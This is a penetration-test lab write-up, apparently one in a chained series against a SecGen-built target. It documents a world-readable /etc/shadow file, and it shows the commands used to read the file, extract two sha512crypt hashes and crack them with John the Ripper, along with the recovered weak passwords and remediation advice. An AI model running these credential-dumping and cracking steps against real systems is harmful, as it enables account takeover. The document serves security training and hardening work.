# Exploit 7: World-Readable /etc/shadow Leading to Offline Credential Cracking

## Summary

`/etc/shadow` on the target is readable by any local user, not just `root`/`shadow` group members. Any low-privilege shell obtained through the other exploits in this set (`distccd`, `druid`, `backupsvc`, `aberrant_distance`) can read every password hash on the box and crack the weak ones offline. Two accounts (`webops`, `analyst`) were cracked from their hashes in under 5 seconds against rockyou.txt.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.100 |
| Misconfiguration | `/etc/shadow` mode `0644` instead of the standard `0640 root:shadow` |
| Attacker | Kali VM on the same host-only lab network |
| Tooling | john the ripper, rockyou.txt |
| Starting account | any local low-privilege account (demonstrated from `distccd`) |

## Vulnerability

Standard Debian permissions on `/etc/shadow` are `-rw-r----- root:shadow`, restricting read access to root and members of the `shadow` group. On this build the file is `-rw-r--r-- root:shadow`, i.e. world-readable, so any authenticated local user (including a low-privilege service account reached via an unrelated RCE) can dump every password hash on the system without any escalation (CWE-732, Incorrect Permission Assignment for Critical Resource).

## Reconnaissance

From an existing low-privilege shell (`distccd` in this instance, reached via `06-distcc-cve-2004-2687.md`):

```
ls -la /etc/shadow
```

```
-rw-r--r-- 1 root shadow 2018 Aug 23 03:54 /etc/shadow
```

## Exploitation

```
cat /etc/shadow
```

All hashes were readable, including `root`, all scenario-created service/lab accounts, and two administrative-looking accounts using sha512crypt (`$6$`) with weak passwords. Two hashes were extracted for offline cracking:

```
cat > /tmp/shadow-hashes.txt << 'EOF'
webops:$6$mysalt$keS/.jtzAKYD9wV9bQrAjV4u.yLgWS2mFKvozgqEeoH41nIzcr8qstXA03Olt88N1VPVPPoT2kiE8zCloBe4H0
analyst:$6$mysalt$NN1QGsmCO0hcvplH4ahY6ocho6F6TgcY8yNdMFAeO.LAeFodNPGA6KsQM5Or1AKbE4QKSqnEsC/SE0Zz3ts9y1
EOF
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow-hashes.txt
john --show /tmp/shadow-hashes.txt
```

## Evidence

```
Loaded 2 password hashes with no different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes

password         (analyst)
administrator    (webops)
2g 0:00:00:04 DONE (2026-08-23 07:11) 0.4866g/s 3612p/s 3612c/s 3674C/s chato..dwayne1

webops:administrator
analyst:password
2 password hashes cracked, 0 left
```

Both accounts cracked in 4 seconds against a standard wordlist, confirming both the readable-shadow misconfiguration and the weak-password misconfiguration as independently exploitable, chained findings.

## Outcome

Plaintext credentials for `webops` (`administrator`) and `analyst` (`password`), usable for SSH login and as the starting point for checking each account's local privileges (see the sudo AWK investigation, tracked separately once the responsible account is confirmed).

## Remediation

- Correct `/etc/shadow` permissions to `0640 root:shadow` (the Debian default); audit for any provisioning step (in this case, inherited from the SecGen build) that weakens this.
- Enforce a password policy that rejects dictionary-crackable passwords (`pam_pwquality`/`pam_cracklib`), regardless of shadow file permissions, as defence in depth.
- Prefer SSH key-based authentication over password authentication for any account with interactive shell access.

## Lab Dependencies

**Prerequisite exploit(s):** Any exploit providing a local low-privilege shell; originally validated using Exploit 06 - DistCC RCE  
**Required starting access:** Any local low-privilege shell on the target  
**Starting account:** Any local account able to read `/etc/shadow`; tested as `distccd`  
**Resulting access:** Recovered credentials for `webops` and `analyst`, permitting authenticated SSH access  
**Provides access for:** Exploit 08 - SUID Nano privilege escalation via the recovered `analyst` credentials; also provides authenticated accounts for other account-specific local privilege-escalation testing